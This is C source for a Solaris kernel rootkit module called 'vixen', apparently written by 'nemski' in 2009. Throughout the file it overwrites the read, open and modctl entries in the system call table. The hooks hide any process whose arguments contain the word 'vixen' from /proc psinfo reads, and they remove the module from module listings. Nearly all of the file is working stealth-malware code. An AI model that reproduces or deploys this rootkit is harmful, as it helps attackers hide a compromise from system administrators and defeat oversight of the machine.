/*
**
**              nemski was here
**
**              25/05/2009
**              "We can't stop here, this is Bat country!"
**
*/

#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/modctl.h>
#include <sys/syscall.h>
#include <sys/procfs.h>

#define MAGIC "vixen"
char magic[] = MAGIC;
char psinfo[] = "psinfo";
int psfildes = 0;

extern struct mod_ops mod_miscops;

int (*oldread) (int fildes, void *buf, size_t nbyte);
int (*oldopen) (const char *path, int oflag, mode_t mode);
int (*oldmodctl) (int cmd, uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4, uintptr_t a5);
int (*oldgetmsg) (int fdes, struct strbuf *ctl, struct strbuf *data, int *flagsp);

int newopen(const char *path, int oflag, mode_t mode)
{
  int ret;
  const char *pathk;
  size_t * done;

  ret = oldopen(path, oflag, mode);

  pathk = (char *) kmem_alloc(256, KM_SLEEP);

  /* We like to use copyin/copyout as SPARC won't let us directly address
  ** userland memory */
  copyinstr((char *) path, (char *) pathk, 256, done);
  if (strstr(pathk, (char *) &psinfo) != NULL) {
    psfildes = ret;
  } else {
    psfildes = 0;
  }

  kmem_free(pathk, 256);

  return ret;
}

ssize_t newread(int fildes, void *buf, size_t nbyte)
{
  ssize_t ret;
  psinfo_t *info;

  ret = oldread(fildes, buf, nbyte);
  if(fildes > 0 && fildes == psfildes && nbyte ==sizeof(psinfo_t)) {
    info = (psinfo_t *) kmem_alloc(sizeof(psinfo_t), KM_SLEEP);
    copyin(buf, (void *) info, sizeof(psinfo_t));

    if(strstr(info->pr_psargs, MAGIC) != NULL) {
      kmem_free(info, sizeof(psinfo_t));
      set_errno(ENOENT);
      return -1;
    } else {
      kmem_free(info, sizeof(psinfo_t));
    }
  }

  return ret;
}

int newmodctl(int cmd, uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4, uintptr_t a5)
{
  int retval;
  struct modinfo * modinfo;

  retval = oldmodctl(cmd, a1, a2, a3, a4, a5);

  if(cmd == MODINFO && retval >= 0) {
    modinfo = (struct modinfo *) kmem_alloc(sizeof(* modinfo), KM_SLEEP);
    copyin(a2, (struct modinfo *) modinfo, sizeof(* modinfo));
/*              modinfo = (struct modinfo *)a2; */

    /* If this module is us, we simply move the pointer for the next object in
    ** the linked list, into a1 and call modctl() again */
    if(strstr(modinfo->mi_name,MAGIC)) {
      copyout(modinfo->mi_id, (struct modinfo *) a1, sizeof(modinfo->mi_id));
/*                      a1 = modinfo->mi_id; */
      retval = oldmodctl(cmd, a1, a2, a3, a4, a5);
    }
    kmem_free(modinfo, sizeof(* modinfo));
  }

  return retval;
}

static struct modlmisc modlmisc = {
  &mod_miscops,
  "vixen",
};

static struct modlinkage modlinkage = {
  MODREV_1,
  (void *)&modlmisc,
  NULL
};

int _init(void)
{
  int i;
  if((i = mod_install(&modlinkage)) != 0) {
    cmn_err(CE_NOTE,"Couldn't load module\n");
  } else {
    cmn_err(CE_NOTE,"vixen: successfully loaded\n");
  }

  oldread = (void *) sysent[SYS_read].sy_callc;
  oldopen = (void *) sysent[SYS_open].sy_callc;
  oldmodctl = (void *) sysent[SYS_modctl].sy_callc;

  sysent[SYS_read].sy_callc = (void *) newread;
  sysent[SYS_open].sy_callc = (void *) newopen;
  sysent[SYS_modctl].sy_callc = (void *) newmodctl;

  return i;
}

int _info(struct modinfo *modinfop)
{
   return (mod_info(&modlinkage, modinfop));
}

int _fini(void)
{
  int i;

  sysent[SYS_read].sy_callc = (void *) oldread;
  sysent[SYS_open].sy_callc = (void *) oldopen;
  sysent[SYS_modctl].sy_callc = (void *) oldmodctl;

  if((i = mod_remove(&modlinkage)) != 0 ) {
    cmn_err(CE_NOTE,"Couldn't remove module\n");
  } else {
    cmn_err(CE_NOTE,"vixen: successfully removed");
  }
  
  return i;
}